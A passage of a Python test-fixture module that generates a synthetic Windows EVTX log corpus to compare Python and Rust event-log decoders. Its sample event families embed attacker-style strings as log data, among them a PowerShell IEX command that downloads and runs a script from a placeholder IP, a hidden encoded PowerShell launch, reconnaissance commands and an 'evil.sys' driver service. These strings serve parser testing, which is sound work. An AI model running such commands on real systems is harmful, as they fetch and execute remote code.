"""Synthetic EVTX corpus for the Python/Rust EVTX decoder differential.

Everything is generated in-process (no evidence or downloaded files): an
ElfFile/ElfChnk/record/BinXML writer laid out the way Windows writes logs
(resident and referenced templates, inline and shared NameStrings, normal and
optional substitutions, nested BinXml values, slack copies past the free-space
offset, inactive chunks, truncated files) plus the token kinds the chunk
decoder handles (CDATA, character/entity references, processing instructions,
inline typed values) and every BinXML value type including arrays.

Used by ``tests/test_evtx_engine_diff.py`` and ``scripts/evtx-engine-bench.py``.
"""

from __future__ import annotations

import datetime as dt
import random
import struct
from collections.abc import Callable, Iterable, Sequence
from dataclasses import dataclass, field
from pathlib import Path

EPOCH = dt.datetime(1601, 1, 1, tzinfo=dt.timezone.utc)
BASE_TIME = dt.datetime(2025, 5, 27, 1, 51, 29, tzinfo=dt.timezone.utc)
CHUNK_SIZE = 65536
CHUNK_HEADER_SIZE = 512
SECURITY = "Microsoft-Windows-Security-Auditing"


def filetime(moment: dt.datetime, extra_100ns: int = 0) -> int:
    return (moment - EPOCH) // dt.timedelta(microseconds=1) * 10 + extra_100ns


def utf16(text: str) -> bytes:
    return text.encode("utf-16le", errors="surrogatepass")


def units(text: str) -> int:
    return len(utf16(text)) // 2


# -- typed values: (value_type, bytes) -----------------------------------------
def wstr(text: str) -> tuple[int, bytes]:
    return 0x01, utf16(text)


def ansi(raw: bytes) -> tuple[int, bytes]:
    return 0x02, raw


def i8(v: int) -> tuple[int, bytes]:
    return 0x03, struct.pack("<b", v)


def u8(v: int) -> tuple[int, bytes]:
    return 0x04, struct.pack("<B", v)


def i16(v: int) -> tuple[int, bytes]:
    return 0x05, struct.pack("<h", v)


def u16(v: int) -> tuple[int, bytes]:
    return 0x06, struct.pack("<H", v)


def i32(v: int) -> tuple[int, bytes]:
    return 0x07, struct.pack("<i", v)


def u32(v: int) -> tuple[int, bytes]:
    return 0x08, struct.pack("<I", v)


def i64(v: int) -> tuple[int, bytes]:
    return 0x09, struct.pack("<q", v)


def u64(v: int) -> tuple[int, bytes]:
    return 0x0A, struct.pack("<Q", v)


def real32(v: float) -> tuple[int, bytes]:
    return 0x0B, struct.pack("<f", v)


def real64(v: float) -> tuple[int, bytes]:
    return 0x0C, struct.pack("<d", v)


def boolean(v: int) -> tuple[int, bytes]:
    return 0x0D, struct.pack("<I", v)


def binary(raw: bytes) -> tuple[int, bytes]:
    return 0x0E, raw


def guid(raw: bytes) -> tuple[int, bytes]:
    return 0x0F, raw


def sizet(v: int, width: int = 8) -> tuple[int, bytes]:
    return 0x10, v.to_bytes(width, "little")


def ft(v: int) -> tuple[int, bytes]:
    return 0x11, struct.pack("<Q", v)


def systime(year: int, month: int, day: int, hour: int = 0, minute: int = 0, second: int = 0, ms: int = 0) -> tuple[int, bytes]:
    return 0x12, struct.pack("<8H", year, month, 0, day, hour, minute, second, ms)


def sid_bytes(text: str) -> bytes:
    parts = text.split("-")
    revision, authority, subs = int(parts[1]), int(parts[2]), [int(item) for item in parts[3:]]
    return bytes([revision, len(subs)]) + authority.to_bytes(6, "big") + b"".join(struct.pack("<I", item) for item in subs)


def sid(text: str) -> tuple[int, bytes]:
    return 0x13, sid_bytes(text)


def hex32(v: int) -> tuple[int, bytes]:
    return 0x14, struct.pack("<I", v)


def hex64(v: int) -> tuple[int, bytes]:
    return 0x15, struct.pack("<Q", v)


def null() -> tuple[int, bytes]:
    return 0x00, b""


def array(item_type: int, raw: bytes) -> tuple[int, bytes]:
    return 0x80 | item_type, raw


# -- BinXML trees ---------------------------------------------------------------
@dataclass(frozen=True)
class Sub:
    index: int
    value_type: int = 0x01
    optional: bool = True


@dataclass(frozen=True)
class Text:
    text: str


@dataclass(frozen=True)
class CData:
    text: str


@dataclass(frozen=True)
class CharRef:
    code_point: int


@dataclass(frozen=True)
class EntityRef:
    name: str


@dataclass(frozen=True)
class PI:
    target: str
    data: str


@dataclass(frozen=True)
class Inline:
    """0x05 value token with a typed payload (encoded per the decoder's size rules)."""

    value_type: int
    raw: bytes


@dataclass(frozen=True)
class RawTokens:
    data: bytes


@dataclass(frozen=True)
class El:
    name: str
    attrs: tuple = ()
    children: tuple = ()


def el(name: str, attrs: Sequence[tuple[str, object]] = (), children: Sequence[object] = ()) -> El:
    return El(name, tuple((key, tuple(value) if isinstance(value, list) else (value,)) for key, value in attrs), tuple(children))


FIXED_SIZES = {0x03: 1, 0x04: 1, 0x05: 2, 0x06: 2, 0x07: 4, 0x08: 4, 0x09: 8, 0x0A: 8, 0x0B: 4, 0x0C: 8, 0x0D: 4, 0x0F: 16, 0x11: 8, 0x12: 16, 0x14: 4, 0x15: 8}


class ChunkNames:
    """NameString placement: inline at first use, referenced by offset afterwards."""

    def __init__(self, share: bool = True) -> None:
        self.offsets: dict[str, int] = {}
        self.share = share

    def encode(self, name: str, position: int) -> bytes:
        """Bytes for the u32 name offset (+ inline node) written at ``position``."""
        if self.share and name in self.offsets:
            return struct.pack("<I", self.offsets[name])
        node_offset = position + 4
        self.offsets.setdefault(name, node_offset)
        return struct.pack("<I", node_offset) + b"\x00\x00\x00\x00\x00\x00" + struct.pack("<H", units(name)) + utf16(name) + b"\x00\x00"


def encode_content(item: object, base: int, names: ChunkNames) -> bytes:
    if isinstance(item, El):
        return encode_element(item, base, names)
    if isinstance(item, Sub):
        return bytes([0x0E if item.optional else 0x0D]) + struct.pack("<HB", item.index, item.value_type)
    if isinstance(item, Text):
        return b"\x05\x01" + struct.pack("<H", units(item.text)) + utf16(item.text)
    if isinstance(item, CData):
        return b"\x07" + struct.pack("<H", units(item.text)) + utf16(item.text)
    if isinstance(item, CharRef):
        return b"\x08" + struct.pack("<H", item.code_point)
    if isinstance(item, EntityRef):
        return b"\x09" + names.encode(item.name, base + 1)
    if isinstance(item, PI):
        head = b"\x0a" + names.encode(item.target, base + 1)
        return head + b"\x0b" + struct.pack("<H", units(item.data)) + utf16(item.data)
    if isinstance(item, Inline):
        if item.value_type in FIXED_SIZES or item.value_type == 0x13:
            return bytes([0x05, item.value_type]) + item.raw
        return bytes([0x05, item.value_type]) + struct.pack("<H", len(item.raw)) + item.raw
    if isinstance(item, RawTokens):
        return item.data
    return encode_content(Text(str(item)), base, names)


def encode_element(node: El, base: int, names: ChunkNames) -> bytes:
    out = bytearray()
    out.extend(bytes([0x41 if node.attrs else 0x01]) + b"\xff\xff" + b"\x00\x00\x00\x00")
    out.extend(names.encode(node.name, base + len(out)))
    if node.attrs:
        out.extend(b"\x00\x00\x00\x00")
        for position, (attr_name, parts) in enumerate(node.attrs):
            more = 0x40 if position + 1 < len(node.attrs) else 0
            out.append(0x06 | more)
            out.extend(names.encode(attr_name, base + len(out)))
            for part in parts:
                out.extend(encode_content(part, base + len(out), names))
    if not node.children:
        out.append(0x03)
        return bytes(out)
    out.append(0x02)
    for child in node.children:
        out.extend(encode_content(child, base + len(out), names))
    out.append(0x04)
    return bytes(out)


Value = tuple[int, "bytes | Callable[[int], bytes]"]


class Chunk:
    """One ElfChnk: records are appended in order; ``slack`` writes past free space."""

    def __init__(self, *, share_names: bool = True) -> None:
        self.data = bytearray(CHUNK_HEADER_SIZE)
        self.names = ChunkNames(share_names)
        self.templates: dict[object, int] = {}
        self.record_ids: list[int] = []
        self.last_record_offset = CHUNK_HEADER_SIZE
        self.free_space: int | None = None

    def room(self) -> int:
        return CHUNK_SIZE - len(self.data)

    def _template_definition(self, tree: El, position: int) -> bytes:
        body = b"\x0f\x01\x01\x00" + encode_element(tree, position + 24 + 4, self.names) + b"\x00"
        return b"\x00\x00\x00\x00" + bytes(range(16, 32)) + struct.pack("<I", len(body)) + body

    def instance(self, position: int, key: object, tree: El, values: Sequence[Value]) -> bytes:
        out = bytearray(b"\x0c\x01" + struct.pack("<I", 0x1234))
        if key in self.templates:
            out.extend(struct.pack("<I", self.templates[key]))
        else:
            template_offset = position + 10
            self.templates[key] = template_offset
            out.extend(struct.pack("<I", template_offset))
            out.extend(self._template_definition(tree, template_offset))
        out.extend(struct.pack("<I", len(values)))
        value_start = position + len(out) + 4 * len(values)
        encoded: list[tuple[int, bytes]] = []
        cursor = value_start
        for value_type, raw in values:
            data = raw(cursor) if callable(raw) else raw
            encoded.append((value_type, data))
            cursor += len(data)
        for value_type, data in encoded:
            out.extend(struct.pack("<HBB", len(data), value_type, 0))
        for _, data in encoded:
            out.extend(data)
        return bytes(out)

    def nested(self, key: object, tree: El, values: Sequence[Value]) -> Value:
        """0x21 BinXml value: fragment header + template instance at its own offset."""
        return 0x21, lambda offset: b"\x0f\x01\x01\x00" + self.instance(offset + 4, key, tree, values)

    def record_bytes(self, record_id: int, header_filetime: int, payload: Callable[[int], bytes]) -> bytes:
        position = len(self.data)
        body = payload(position + 24)
        size = 24 + len(body) + 4
        return b"**\x00\x00" + struct.pack("<IQQ", size, record_id, header_filetime) + body + struct.pack("<I", size)

    def add(self, record_id: int, header_filetime: int, payload: Callable[[int], bytes], *, limit: int = CHUNK_SIZE - 64) -> bool:
        if self.free_space is not None:
            raise RuntimeError("records after slack")
        snapshot = (dict(self.names.offsets), dict(self.templates))
        record = self.record_bytes(record_id, header_filetime, payload)
        if len(self.data) + len(record) > limit:
            self.names.offsets, self.templates = snapshot
            return False
        self.last_record_offset = len(self.data)
        self.data.extend(record)
        self.record_ids.append(record_id)
        return True

    def slack(self, record_id: int, header_filetime: int, payload: Callable[[int], bytes], gap: int = 16) -> bool:
        if self.free_space is None:
            self.free_space = len(self.data)
        self.data.extend(b"\x00" * gap)
        record = self.record_bytes(record_id, header_filetime, payload)
        if len(self.data) + len(record) > CHUNK_SIZE:
            del self.data[-gap:]
            return False
        self.data.extend(record)
        return True

    def garbage(self, raw: bytes) -> None:
        if self.free_space is None:
            self.free_space = len(self.data)
        self.data.extend(raw[: max(0, CHUNK_SIZE - len(self.data))])

    def finish(self) -> bytes:
        free_space = self.free_space if self.free_space is not None else len(self.data)
        out = bytearray(self.data) + b"\x00" * (CHUNK_SIZE - len(self.data))
        out[0:8] = b"ElfChnk\x00"
        ids = self.record_ids or [0]
        struct.pack_into("<QQQQ", out, 8, min(ids), max(ids), min(ids), max(ids))
        struct.pack_into("<III", out, 40, 128, self.last_record_offset, free_space)
        return bytes(out)


def file_bytes(chunks: Sequence[bytes], *, declared_chunks: int | None = None, next_record_id: int = 1) -> bytes:
    header = bytearray(4096)
    header[0:8] = b"ElfFile\x00"
    struct.pack_into("<QQQ", header, 8, 0, max(len(chunks) - 1, 0), next_record_id)
    count = len(chunks) if declared_chunks is None else declared_chunks
    struct.pack_into("<IHHHH", header, 32, 128, 1, 3, 4096, count)
    return bytes(header) + b"".join(chunks)


# -- events -----------------------------------------------------------------------
SYSTEM_VALUE_COUNT = 17


def system_tree(section: El | Sub | None) -> El:
    system = el(
        "System",
        children=[
            el("Provider", attrs=[("Name", Sub(0)), ("Guid", Sub(1, 0x0F))]),
            el("EventID", attrs=[("Qualifiers", Sub(2, 0x06))], children=[Sub(3, 0x06, False)]),
            el("Version", children=[Sub(4, 0x04, False)]),
            el("Level", children=[Sub(5, 0x04, False)]),
            el("Task", children=[Sub(6, 0x06, False)]),
            el("Opcode", children=[Sub(7, 0x04, False)]),
            el("Keywords", children=[Sub(8, 0x15, False)]),
            el("TimeCreated", attrs=[("SystemTime", Sub(9, 0x11, False))]),
            el("EventRecordID", children=[Sub(10, 0x0A, False)]),
            el("Correlation", attrs=[("ActivityID", Sub(11, 0x0F))]),
            el("Execution", attrs=[("ProcessID", Sub(12, 0x08)), ("ThreadID", Sub(13, 0x08))]),
            el("Channel", children=[Sub(14, 0x01, False)]),
            el("Computer", children=[Sub(15, 0x01, False)]),
            el("Security", attrs=[("UserID", Sub(16, 0x13))]),
        ],
    )
    children: list[object] = [system]
    if section is not None:
        children.append(section)
    return El("Event", (), tuple(children))


@dataclass
class Event:
    record_id: int
    when: int
    provider: str = SECURITY
    event_id: int = 4624
    channel: str = "Security"
    computer: str = "WIN-QA"
    data: list[tuple[str | None, Value]] = field(default_factory=list)
    # Custom section tree (substitution indices from SYSTEM_VALUE_COUNT) + values.
    section: El | Sub | None = None
    section_values: list[Value] = field(default_factory=list)
    user_sid: str | None = "S-1-5-18"
    qualifiers: int | None = None
    header_filetime: int | None = None
    time_value: Value | None = None
    record_id_value: Value | None = None

    def system_values(self) -> list[Value]:
        return [
            wstr(self.provider),
            guid(bytes(range(16))),
            u16(self.qualifiers) if self.qualifiers is not None else null(),
            u16(self.event_id),
            u8(0),
            u8(4),
            u16(12544),
            u8(0),
            hex64(0x8020000000000000),
            self.time_value or ft(self.when),
            self.record_id_value or u64(self.record_id),
            null(),
            u32(612),
            u32(616),
            wstr(self.channel),
            wstr(self.computer),
            sid(self.user_sid) if self.user_sid else null(),
        ]

    def tree_and_values(self) -> tuple[El, list[Value]]:
        if self.section is not None or not self.data:
            return system_tree(self.section), [*self.system_values(), *self.section_values]
        children = []
        for offset, (name, _) in enumerate(self.data):
            attrs = [("Name", Text(name))] if name is not None else []
            children.append(el("Data", attrs=attrs, children=[Sub(SYSTEM_VALUE_COUNT + offset, 0x01)]))
        tree = system_tree(el("EventData", children=children))
        return tree, [*self.system_values(), *(value for _, value in self.data)]

    def payload(self, chunk: Chunk) -> Callable[[int], bytes]:
        tree, values = self.tree_and_values()
        key = repr(tree)

        def build(position: int) -> bytes:
            return b"\x0f\x01\x01\x00" + chunk.instance(position + 4, key, tree, values)

        return build


def add_event(chunk: Chunk, event: Event) -> bool:
    return chunk.add(event.record_id, event.when if event.header_filetime is None else event.header_filetime, event.payload(chunk))


def add_slack_event(chunk: Chunk, event: Event) -> bool:
    return chunk.slack(event.record_id, event.when, event.payload(chunk))


def direct_payload(chunk: Chunk, tree: El) -> Callable[[int], bytes]:
    """Record body of element tokens without a template instance."""
    return lambda position: b"\x0f\x01\x01\x00" + encode_element(tree, position + 4, chunk.names) + b"\x00"


# -- event families -----------------------------------------------------------------
KOREAN_USERS = ("진료실1$", "관리자", "홍길동", "원격PC", "사용자😀")


def logon_event(record_id: int, when: int, rng: random.Random) -> Event:
    user = rng.choice(KOREAN_USERS)
    return Event(
        record_id,
        when,
        data=[
            ("SubjectUserSid", sid("S-1-5-18")),
            ("SubjectUserName", wstr("진료실1$")),
            ("SubjectDomainName", wstr("WORKGROUP")),
            ("SubjectLogonId", hex64(0x3E7)),
            ("TargetUserSid", sid(f"S-1-5-21-1111-2222-3333-{1000 + record_id % 50}")),
            ("TargetUserName", wstr(user)),
            ("TargetDomainName", wstr("진료실1")),
            ("TargetLogonId", hex64(0x10000 + record_id)),
            ("LogonType", u32(rng.choice((2, 3, 10)))),
            ("WorkstationName", wstr("원격PC")),
            ("ProcessName", wstr("C:\\Windows\\System32\\svchost.exe")),
            ("IpAddress", wstr(f"192.0.2.{record_id % 250 + 1}")),
            ("IpPort", wstr(str(40000 + record_id % 20000))),
        ],
    )


def process_event(record_id: int, when: int, rng: random.Random) -> Event:
    command = rng.choice(
        (
            "powershell.exe -nop -w hidden -enc SQBFAFgA",
            'cmd.exe /c "whoami /all & net user 관리자"',
            "C:\\Users\\홍길동\\AppData\\Local\\Temp\\update.exe --silent",
        )
    )
    return Event(
        record_id,
        when,
        event_id=4688,
        data=[
            ("SubjectUserSid", sid("S-1-5-21-1111-2222-3333-1001")),
            ("SubjectUserName", wstr("홍길동")),
            ("NewProcessId", hex64(0x1A2C + record_id % 999)),
            ("NewProcessName", wstr(command.split(" ")[0])),
            ("TokenElevationType", wstr("%%1936")),
            ("ProcessId", hex64(0x4)),
            ("CommandLine", wstr(command)),
            ("ParentProcessName", wstr("C:\\Windows\\explorer.exe")),
        ],
    )


def service_event(record_id: int, when: int, rng: random.Random) -> Event:
    return Event(
        record_id,
        when,
        provider="Service Control Manager",
        event_id=7045,
        channel="System",
        qualifiers=16384,
        data=[
            ("ServiceName", wstr(f"svc{record_id % 7}")),
            ("ImagePath", wstr("%SystemRoot%\\system32\\drivers\\evil.sys")),
            ("ServiceType", wstr("kernel mode driver")),
            ("StartType", wstr("demand start")),
            ("AccountName", wstr("")),
        ],
    )


def script_block_event(record_id: int, when: int, rng: random.Random) -> Event:
    return Event(
        record_id,
        when,
        provider="Microsoft-Windows-PowerShell",
        event_id=4104,
        channel="Microsoft-Windows-PowerShell/Operational",
        data=[
            ("MessageNumber", i32(1)),
            ("MessageTotal", i32(1)),
            ("ScriptBlockText", wstr("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')")),
            ("ScriptBlockId", guid(rng.randbytes(16))),
            ("Path", wstr("")),
        ],
    )


def kernel_event(record_id: int, when: int, rng: random.Random) -> Event:
    return Event(
        record_id,
        when,
        provider="Microsoft-Windows-Kernel-General",
        event_id=16,
        channel="System",
        data=[("Value", u32(record_id)), ("Detail", real64(rng.random() * 1000))],
    )


EVENT_FAMILIES = (logon_event, process_event, service_event, script_block_event, kernel_event)


def mixed_event(record_id: int, when: int, rng: random.Random) -> Event:
    return rng.choice(EVENT_FAMILIES)(record_id, when, rng)


def iter_mixed_chunks(
    record_count: int,
    *,
    seed: int = 1,
    slack_per_chunk: int = 2,
    first_record_id: int = 1,
) -> Iterable[bytes]:
    """Chunks of mixed events with 7-digit FILETIMEs and slack copies, ``record_count`` live records."""
    rng = random.Random(seed)
    record_id = first_record_id
    remaining = record_count
    when = filetime(BASE_TIME)
    while remaining > 0:
        chunk = Chunk()
        written = 0
        while remaining > 0:
            when += rng.randrange(1, 50_000_000)
            event = mixed_event(record_id, when, rng)
            if not add_event(chunk, event):
                break
            record_id += 1
            remaining -= 1
            written += 1
        if not written:
            raise RuntimeError("event larger than a chunk")
        for index in range(slack_per_chunk):
            # Overwritten ring-buffer residue: older ids (stale) and a copy of a live id.
            stale_id = max(1, first_record_id - 1000 - index) if index % 2 == 0 else record_id - 1
            chunk.slack(stale_id, when, mixed_event(stale_id, when - 10_000_000, rng).payload(chunk))
        yield chunk.finish()


def write_mixed_evtx(path: Path, record_count: int, *, seed: int = 1, slack_per_chunk: int = 2) -> Path:
    """Stream a ``record_count``-record EVTX to ``path`` (header chunk count capped at u16)."""
    chunks = 0
    with open(path, "wb") as handle:
        handle.write(b"\x00" * 4096)
        for chunk in iter_mixed_chunks(record_count, seed=seed, slack_per_chunk=slack_per_chunk):
            handle.write(chunk)
            chunks += 1
        handle.seek(0)
        handle.write(file_bytes([], declared_chunks=min(chunks, 0xFFFF), next_record_id=record_count + 1)[:4096])
    return path


# -- edge-case corpus ----------------------------------------------------------------------
def kitchen_sink_values() -> list[tuple[str | None, Value]]:
    """One Data per value type / formatting edge the decoder renders."""
    return [
        ("Int8", i8(-5)),
        ("UInt8", u8(200)),
        ("Int16", i16(-300)),
        ("UInt16", u16(60000)),
        ("Int32", i32(-70000)),
        ("UInt32", u32(4_000_000_000)),
        ("Int64", i64(-(2**40))),
        ("UInt64", u64(2**63 + 5)),
        ("Real32", real32(0.1)),
        ("Real32Inf", real32(float("inf"))),
        ("Real32Nan", real32(float("nan"))),
        ("Real64Big", real64(1e16)),
        ("Real64Small", real64(1e-5)),
        ("Real64NegZero", real64(-0.0)),
        ("Real64Whole", real64(3.0)),
        ("Real64Frac", real64(123.456)),
        ("Real64Huge", real64(1.7976931348623157e308)),
        ("Real64Tiny", real64(5e-324)),
        ("Real64Fixed", real64(1234567890123456.0)),
        ("BoolTrue", boolean(1)),
        ("BoolFalse", boolean(0)),
        ("Binary", binary(bytes(range(0, 256, 17)))),
        ("Guid", guid(bytes(range(100, 116)))),
        ("SizeT4", sizet(0xDEADBEEF, 4)),
        ("SizeT8", sizet(0x1122334455667788)),
        ("FileTime", ft(filetime(BASE_TIME, 1234567))),
        ("FileTimeZero", ft(0)),
        ("FileTimeHuge", ft(2**64 - 1)),
        ("SysTime", systime(2024, 2, 29, 23, 59, 58, 999)),
        ("SysTimeBad", systime(2023, 2, 29, 1, 2, 3, 4)),
        ("SysTimeZero", systime(0, 0, 0)),
        ("Sid", sid("S-1-5-21-1111-2222-3333-500")),
        ("SidShort", (0x13, b"\x01\x05\x00")),
        ("SidTruncated", (0x13, b"\x01\x05" + b"\x00" * 10)),
        ("HexInt32", hex32(0xC000006D)),
        ("HexInt64", hex64(0xFFFFFFFFFFFFFFFF)),
        ("AnsiAscii", ansi(b"plain ansi\x00\x00")),
        ("AnsiEmpty", ansi(b"")),
        ("StringArray", array(0x01, utf16("alpha\x00베타\x00\x00"))),
        ("StringArrayEmpty", array(0x01, b"")),
        ("AnsiArray", array(0x02, b"one\x00two\x00\x00")),
        ("UInt16Array", array(0x06, struct.pack("<3H", 1, 2, 65535))),
        ("Int64Array", array(0x09, struct.pack("<2q", -1, 2**62))),
        ("Real32Array", array(0x0B, struct.pack("<2f", 1.5, -0.25))),
        ("Real64Array", array(0x0C, struct.pack("<2d", 1e300, 2.5e-7))),
        ("BoolArray", array(0x0D, struct.pack("<3I", 1, 0, 7))),
        ("GuidArray", array(0x0F, bytes(range(32)))),
        ("SizeTArray4", array(0x10, struct.pack("<3I", 1, 2, 3))),
        ("SizeTArray8", array(0x10, struct.pack("<2Q", 1, 2))),
        ("FileTimeArray", array(0x11, struct.pack("<2Q", filetime(BASE_TIME, 7), 0))),
        ("SysTimeArray", array(0x12, struct.pack("<8H", 2020, 1, 0, 2, 3, 4, 5, 6) + struct.pack("<8H", 2020, 13, 0, 2, 3, 4, 5, 6))),
        ("SidArray", array(0x13, sid_bytes("S-1-5-18") + sid_bytes("S-1-5-32-544") + b"\x01\x09\x00")),
        ("HexInt32Array", array(0x14, struct.pack("<2I", 10, 255))),
        ("HexInt64Array", array(0x15, struct.pack("<Q", 2**40))),
        ("BinaryArray", array(0x0E, b"\x01\x02")),
        ("UnknownArray", array(0x7E, b"\xaa")),
        ("UInt32ArrayRagged", array(0x08, b"\x01\x00\x00\x00\x02\x00")),
        ("Unknown", (0x30, b"\xab\xcd")),
        ("Real32Short", (0x0B, b"\x01\x02")),
        ("GuidShort", (0x0F, b"\x01\x02\x03")),
        ("BoolEmpty", (0x0D, b"")),
        ("FileTimeShort", (0x11, b"\x01")),
        ("NullValue", null()),
        ("BinXmlNotNested", (0x21, b"\x00")),
        (None, wstr("unnamed first")),
        (None, wstr("unnamed second")),
        ("Dup", wstr("one")),
        ("Dup", wstr("two")),
        ("Dup_2", wstr("collides with de-duplicated name")),
        ("Dup", wstr("three")),
        ("", wstr("empty name")),
        ("Bad\x01Name", wstr("control char in name")),
        ("Space Name(UTC)", wstr("punctuated")),
        ("한글이름", wstr("non-ASCII key")),
        ("Markup", wstr('<tag attr="x">&amp; \'q\'</tag>')),
        ("LoneSurrogate", (0x01, b"A\x00\x00\xd8B\x00")),
        ("TrailingNuls", wstr("padded\x00\x00\x00")),
        ("OddBytes", (0x01, utf16("odd") + b"\x41")),
        ("Emoji", wstr("😀 이모지")),
        ("LongText", wstr("가나다라마바사" * 400)),
    ]


def kitchen_sink_event(record_id: int, when: int) -> Event:
    return Event(record_id, when, provider="Synthetic-Kitchen-Sink", event_id=1, channel="Application", data=kitchen_sink_values())


def token_tree_event(chunk: Chunk, record_id: int, when: int) -> tuple[int, int, Callable[[int], bytes]]:
    """CDATA, char/entity refs, PI, inline typed values, multi-part attributes (direct tokens)."""
    tree = el(
        "Event",
        children=[
            el(
                "System",
                children=[
                    el("Provider", attrs=[("Name", [Text("Synthetic-"), Text("Tokens")])]),
                    el("EventID", children=[Inline(0x06, struct.pack("<H", 42))]),
                    el("TimeCreated", attrs=[("SystemTime", Inline(0x0A, struct.pack("<Q", when)))]),
                    el("EventRecordID", children=[Inline(0x0A, struct.pack("<Q", record_id))]),
                    el("EventRecordID", children=[]),
                    el("Channel", children=[Text("Setup"), Text("/Operational")]),
                    el("Computer", children=[CharRef(0xD55C), CharRef(0x0041), EntityRef("amp"), EntityRef("custom")]),
                    el("Security", attrs=[("UserID", Inline(0x13, sid_bytes("S-1-5-21-9-8-7-1001")))]),
                    el("Execution", attrs=[("ProcessID", Inline(0x08, struct.pack("<I", 4))), ("KernelTime", Inline(0x14, struct.pack("<I", 9)))]),
                ],
            ),
            el(
                "EventData",
                children=[
                    el("Data", attrs=[("Name", Text("Cdata"))], children=[CData("<raw & cdata>")]),
                    el("Data", attrs=[("Name", Text("Refs"))], children=[Text("a"), EntityRef("lt"), EntityRef("gt"), EntityRef("quot"), EntityRef("apos"), CharRef(0x263A)]),
                    el("Data", attrs=[("Name", Text("Pi"))], children=[PI("xml-stylesheet", 'href="x"'), Text("after-pi")]),
                    el("Data", attrs=[("Name", Text("InlineReal"))], children=[Inline(0x0C, struct.pack("<d", 2.5))]),
                    el("Data", attrs=[("Name", Text("InlineBinary"))], children=[Inline(0x0E, b"\x00\xff")]),
                    el("Data", attrs=[("Name", Text("Empty"))]),
                    el("Group", children=[el("Inner", children=[Text("leaf-1")]), el("Inner", children=[Text("leaf-2")])]),
                    el("Data", children=[Text("no name attr")]),
                ],
            ),
            el("UserData", children=[el("Ignored", children=[Text("second section")])]),
        ],
    )
    return record_id, when, direct_payload(chunk, tree)


def user_data_event(record_id: int, when: int) -> Event:
    section = el(
        "UserData",
        children=[
            el(
                "LogFileCleared",
                attrs=[("xmlns", Text("http://manifests.microsoft.com/win/2004/08/windows/eventlog"))],
                children=[
                    el("SubjectUserSid", children=[Sub(SYSTEM_VALUE_COUNT, 0x13)]),
                    el("SubjectUserName", children=[Sub(SYSTEM_VALUE_COUNT + 1)]),
                    el("SubjectUserName", children=[Sub(SYSTEM_VALUE_COUNT + 2)]),
                    el("Nested", children=[el("Deep", children=[Sub(SYSTEM_VALUE_COUNT + 3, 0x08)])]),
                ],
            )
        ],
    )
    return Event(
        record_id,
        when,
        provider=PROVIDER_EVENTLOG,
        event_id=1102,
        section=section,
        section_values=[sid("S-1-5-21-1111-2222-3333-500"), wstr("관리자"), wstr("dup"), u32(7)],
    )


PROVIDER_EVENTLOG = "Microsoft-Windows-Eventlog"


def processing_error_event(record_id: int, when: int) -> Event:
    section = el("ProcessingErrorData", children=[Text("only text"), Sub(SYSTEM_VALUE_COUNT, 0x08)])
    return Event(record_id, when, provider="Synthetic-ProcessingError", event_id=3, section=section, section_values=[u32(5)])


def nested_event(chunk: Chunk, record_id: int, when: int) -> Event:
    names = ["Inner1", "Inner2", "Inner2"]
    tree = el("EventData", children=[el("Data", attrs=[("Name", Text(name))], children=[Sub(index)]) for index, name in enumerate(names)])
    nested_value = chunk.nested(("nested", tuple(names)), tree, [wstr("n1"), u32(2), wstr("중첩")])
    attr_tree = el("Payload", children=[Text("in attr")])
    attr_value = chunk.nested(("attr", 1), attr_tree, [])
    section = el(
        "EventData",
        children=[
            el("Data", attrs=[("Name", Text("Wrapped"))], children=[Sub(SYSTEM_VALUE_COUNT, 0x21)]),
            el("Data", attrs=[("Name", Sub(SYSTEM_VALUE_COUNT + 1, 0x21))], children=[Text("attr from nested")]),
            el("Data", attrs=[("Name", Text("BadNested"))], children=[Sub(SYSTEM_VALUE_COUNT + 2, 0x21)]),
        ],
    )
    return Event(
        record_id,
        when,
        provider="Synthetic-Nested",
        event_id=4,
        section=section,
        section_values=[nested_value, attr_value, (0x21, b"\x0f\x01\x01\x00\x0c\x01\x00\x00\x00\x00\xff\xff\x00\x00")],
    )


def odd_system_event(record_id: int, when: int) -> Event:
    """TimeCreated as UInt64 (raw int), missing user SID, record-id substitution as string."""
    return Event(
        record_id,
        when,
        provider="Synthetic-Odd-System",
        event_id=5,
        channel="",
        computer="",
        user_sid=None,
        time_value=u64(when + 1),
        record_id_value=wstr("not-a-number"),
        data=[("Only", wstr("x"))],
        header_filetime=when - 5,
    )


def deep_event(chunk: Chunk, record_id: int, when: int, depth: int) -> Callable[[int], bytes]:
    node: El = el("Leaf", children=[Text("bottom")])
    for level in range(depth):
        node = el(f"L{level % 3}", children=[node])
    tree = el("Event", children=[el("System", children=[el("Channel", children=[Text("Deep")])]), el("EventData", children=[node])])
    return direct_payload(chunk, tree)


def broken_payload(kind: str) -> Callable[[int], bytes]:
    """Record bodies that make the decoder raise (each error message is compared)."""

    def build(position: int) -> bytes:
        head = b"\x0f\x01\x01\x00"
        if kind == "truncated-substitution":
            return head + b"\x01\xff\xff\x00\x00\x00\x00" + struct.pack("<I", 0) + b"\x0d"
        if kind == "template-out-of-bounds":
            return head + b"\x0c\x01\x00\x00\x00\x00" + struct.pack("<I", 65530) + struct.pack("<I", 0)
        if kind == "too-many-substitutions":
            template_offset = position + 4 + 10
            body = b"\x0f\x01\x01\x00\x01\xff\xff\x00\x00\x00\x00" + struct.pack("<I", template_offset + 24 + 4 + 11) + b"\x00\x00\x00\x00\x00\x00\x01\x00E\x00\x00\x00\x03\x00"
            definition = b"\x00" * 4 + bytes(16) + struct.pack("<I", len(body)) + body
            return head + b"\x0c\x01\x00\x00\x00\x00" + struct.pack("<I", template_offset) + definition + struct.pack("<I", 5000)
        if kind == "name-out-of-bounds":
            return head + b"\x01\xff\xff\x00\x00\x00\x00" + struct.pack("<I", 65534) + b"\x02\x04\x00"
        if kind == "no-root":
            return head + b"\x05\x01\x02\x00h\x00i\x00\x00"
        return head
    return build


def short_integer_event(record_id: int, when: int) -> Event:
    """UInt32 substitution declared 2 bytes long: ``short integer value`` decode error."""
    return Event(record_id, when, provider="Synthetic-Short", event_id=7, data=[("Short", (0x08, b"\x01\x00"))])


def descriptor_index_error_chunk(when: int) -> bytes:
    """Last record's substitution descriptors run into the chunk end: Python ``IndexError``."""
    chunk = Chunk()
    rng = random.Random(11)
    record_id = 1
    while len(chunk.data) < 49_200:
        add_event(chunk, logon_event(record_id, when + record_id, rng))
        record_id += 1
    template_offset = next(iter(chunk.templates.values()))
    # Filler record (EOF token, then zero padding) aligning the next record to 4 bytes.
    position = len(chunk.data)
    pad = (-(position + 24 + 4 + 1 + 4 + 28)) % 4
